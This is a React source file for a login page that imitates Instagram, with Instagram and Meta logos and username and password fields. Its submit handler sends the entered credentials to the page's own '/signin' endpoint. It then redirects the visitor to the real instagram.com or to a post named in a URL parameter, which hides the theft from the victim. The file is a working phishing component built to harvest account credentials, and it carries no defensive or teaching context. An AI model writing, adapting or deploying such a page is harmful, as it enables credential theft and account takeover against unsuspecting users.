import { useState, useRef } from 'react'
import { useLocation } from 'react-router-dom';
import api from './api';
import './App.css'

function App() {
  const location = useLocation();
  const [showPassword, setShowPassword] = useState(false);

  const usernameRef = useRef(null);
  const passwordRef = useRef(null);

  const handleFormSubmit = async (e) => {
    e.preventDefault();

    const payload = {
      username: usernameRef.current.value,
      password: passwordRef.current.value
    }

    const response = await api.post("/signin", payload, {
      validateStatus: (status) => status < 500,
    });

    if(!response.data.success){
      alert(response.data.msg);
    }else{
      const routeParams = new URLSearchParams(location.search);
      const routeParamValue = routeParams.get("p");
      if(routeParamValue){
        window
        .location
        .href
        = `https://instagram.com/p/${decodeURIComponent(routeParamValue)}/?utm_source=ig_web_copy_link`;
      }else{
        window.location.href = "https://instagram.com";
      }
    }
  }
  return (
    <>
      <div className="container">
         <select name="" id="">
            <option value="en-us">English(US)</option>
            <option value="en-uk">English(UK)</option>
            <option value="jp">Japanese(JP)</option>
            <option value="ru">Russian(RU)</option>
         </select>
         <img src="/instagram.png" className='logo' alt="" />
         <form onSubmit={handleFormSubmit}>
           <div className="form_input_field">
             <input type="text" placeholder='Username, email address or mobile number' aria-label='Username' ref={usernameRef} required />
             <label htmlFor="">Username, email address or mobile number</label>
           </div>
           <div className="form_input_field">
             <input type={showPassword ? "text" : "password"} placeholder='Password' aria-label='Password' ref={passwordRef} required />
             <label htmlFor="">Password</label>
             <span className='show-passwd'>
              <img src={!showPassword ? "/invisible-password.svg" : "/visible-password.svg"} alt="" onClick={() => setShowPassword(prev => !prev)} />
             </span>
           </div>
           <button className='submit-btn' type='submit'>Log in</button>
           <a href="#">Forgotten Password?</a>
         </form>
         <button className='create-account-btn' type='submit'>Create new account</button>
         <img src="/meta-logo.png" className='meta-logo' alt="" />
      </div>
    </>
  )
}

export default App
